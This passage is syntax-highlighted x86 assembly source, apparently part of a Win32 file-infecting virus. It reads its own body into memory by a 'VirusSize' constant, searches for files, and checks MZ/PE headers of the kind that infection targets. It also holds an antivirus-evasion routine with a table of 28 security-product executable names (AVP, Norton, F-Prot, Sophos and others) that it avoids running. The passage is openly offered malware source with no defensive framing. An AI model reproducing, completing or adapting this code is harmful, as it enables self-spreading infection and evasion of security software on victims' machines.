 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CmdLine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CommandReceive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CommandOK</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CommandReceive</span><span class="sc0">

</span><span class="sc5">CommandOK</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; CmdLine contains now a pointer </span><span class="sc0">
                          </span><span class="sc1">; to the filename of our file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CmdLine</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Open File</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; Filename is in ESI</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateFileA</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; save handle</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; load the file into the free memory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc0">          </span><span class="sc1">; number of bytes read..</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">            </span><span class="sc1">; read how many bytes ?</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileBuffer</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XReadFile</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -----------------------[ Check if we got an AV ]---------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc5">AVNameCheck</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; pointer to name is in esi</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                     </span><span class="sc1">; save all registers</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">        </span><span class="sc1">; we transfer the name to a buffer</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">NameCheckLoop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; check if we are at the end</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NameTransferred</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                     </span><span class="sc1">; get first letter</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">96d</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">StoreLetter</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32d</span><span class="sc0">               </span><span class="sc1">; convert to uppercase</span><span class="sc0">
 
</span><span class="sc5">StoreLetter</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NameCheckLoop</span><span class="sc0">

</span><span class="sc5">NameTransferred</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; nothing found .. :(</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndNameCheck</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameLen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28d</span><span class="sc0">              </span><span class="sc1">; Number of AV-Names we check</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AVNames</span><span class="sc0">          </span><span class="sc1">; Pointer to the names</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AVLenght</span><span class="sc0">
</span><span class="sc5">CheckLoop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NameCheck</span><span class="sc0">            </span><span class="sc1">; Procedure to check this name</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">WeGotAvName</span><span class="sc0">            </span><span class="sc1">; if Carriage Flag is set we got one</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; otherwise we search on, until edx = 0</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndNameCheck</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; increase esi</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameESI2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckLoop</span><span class="sc0">

</span><span class="sc5">EndNameCheck</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; We found nothing :)</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WeGotAvName</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; We found a dirty AV :(</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">; ESI = 0 as flag</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NameCheck</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ECX contains the size of the search area</span><span class="sc0">
                           </span><span class="sc1">; ESI points to av name</span><span class="sc0">
                           </span><span class="sc1">; EDI points to filename</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameESI2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameLen</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">       </span><span class="sc1">; here we search for the Name</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get first byte into al..</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; avname</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameEDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; filename</span><span class="sc0">

</span><span class="sc5">SearchOn</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameESI</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; avname</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameEDI</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">               </span><span class="sc1">; start search</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoAV</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NameEDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Compare</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; compare the rest of the string</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; points to stringlenght</span><span class="sc0">
</span><span class="sc5">Compare2</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
  </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Compare2</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Found</span><span class="sc0">

</span><span class="sc5">NoAV</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; We got a dirty AV :P</span><span class="sc0">
  </span><span class="sc6">stc</span><span class="sc0">                      </span><span class="sc1">; set flag</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">NameLen</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">            </span><span class="sc1">; Size of the filename</span><span class="sc0">
 </span><span class="sc5">NameESI</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">            </span><span class="sc1">; Pointer to av name</span><span class="sc0">
 </span><span class="sc5">NameEDI</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">            </span><span class="sc1">; Pointer to filename</span><span class="sc0">
 </span><span class="sc5">NameESI2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">            </span><span class="sc1">; Pointer to av name</span><span class="sc0">

                           </span><span class="sc1">; Table with names of AV-File we don't start</span><span class="sc0">
</span><span class="sc5">AVNames</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVPM'</span><span class="sc0">                 </span><span class="sc1">; AVP Names</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP32'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVPCC'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVPTC'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'_AVPM'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'_AVP32'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'_AVPCC'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVPDOS'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVE32'</span><span class="sc0">                </span><span class="sc1">; Anti-Vir</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVGCTRL'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVWIN95'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCAN32'</span><span class="sc0">               </span><span class="sc1">; DR-Solomon</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVCONSOL'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VSHWIN32'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FP-WIN'</span><span class="sc0">               </span><span class="sc1">; F-Prot</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'F-STOPW'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DVP95'</span><span class="sc0">                </span><span class="sc1">; F-Secure</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'F-AGNT95'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'F-PROT95'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VET95'</span><span class="sc0">                </span><span class="sc1">; InnoculateIT</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VETTRAY'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CLAW95'</span><span class="sc0">               </span><span class="sc1">; Norman Virus Control</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NVC95'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAVAPW32'</span><span class="sc0">             </span><span class="sc1">; Norton</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAVW32'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SWEEP95'</span><span class="sc0">              </span><span class="sc1">; Sophos</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IOMON98'</span><span class="sc0">              </span><span class="sc1">; PC-Cillin</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PCCWIN98'</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MONITOR'</span><span class="sc0">              </span><span class="sc1">; RAV</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RAW7WIN'</span><span class="sc0">

</span><span class="sc5">AVLenght</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc0">   </span><span class="sc1">; AVP</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">             </span><span class="sc1">; ANTI-Vir</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">             </span><span class="sc1">; DR-Solomon</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">                 </span><span class="sc1">; F-PROT</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">             </span><span class="sc1">; F-Secure</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">                 </span><span class="sc1">; Innoculate-IT</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc0">                 </span><span class="sc1">; Norman</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc0">                 </span><span class="sc1">; Norton</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">                     </span><span class="sc1">; Sophos</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">                 </span><span class="sc1">; PC-Cillin</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">                 </span><span class="sc1">; RAV</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------------------[ Align-Prozedur ]-------------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
                           </span><span class="sc1">; eax - Size</span><span class="sc0">
                           </span><span class="sc1">; ecx - base</span><span class="sc0">
</span><span class="sc9">Align</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; eax - New Size</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------------------[ FindFile Prozeduren ]--------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

                           </span><span class="sc1">; Search for files</span><span class="sc0">
</span><span class="sc5">FindFirstFileProc</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ClearFindData</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FindNextFileProc</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ClearFindData</span><span class="sc0"> 
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XFindNextFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ClearFindData</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">276d</span><span class="sc0">             </span><span class="sc1">; clear old data</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;-----------------------------[ PE / MZ Check ]------------------------------</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
                           </span><span class="sc1">; Check MZ and PE - Signs</span><span class="sc0">
</span><span class="sc5">CheckPESign</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'FP'</span><span class="sc0"> </span><span class="sc1">; greater or equal to "PF"</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoPESign</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'DP'</span><span class="sc0"> </span><span class="sc1">; lower or equal to "PD"</span><span class="sc0">
